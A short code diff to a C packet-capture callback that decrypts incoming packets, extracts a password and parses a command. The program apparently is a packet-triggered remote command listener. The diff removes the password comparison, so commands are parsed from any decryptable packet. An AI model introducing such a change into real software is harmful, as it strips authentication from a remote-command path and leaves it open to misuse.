@@ -172,9 +172,7 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 		fprintf(stderr, "scanning error\n");
 		return;
 	}
-	// If there happens to be some garbled letters in the decrypted buffer, return immediately
-	if(strcmp(password, PASSWORD) != 0)
-		return;
+	
 
 	printf("Password: %s\n", password);
 	command = parse_cmd(decrypted);
